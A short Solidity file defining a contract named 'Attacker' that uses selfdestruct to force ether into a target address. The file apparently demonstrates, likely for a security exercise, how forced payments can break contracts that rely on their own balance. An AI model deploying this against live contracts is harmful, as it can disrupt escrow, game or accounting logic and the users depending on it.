// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    function sendETH(address payable _targetAddress) public payable {        
        selfdestruct(_targetAddress);
    }
    receive() external payable {}
}
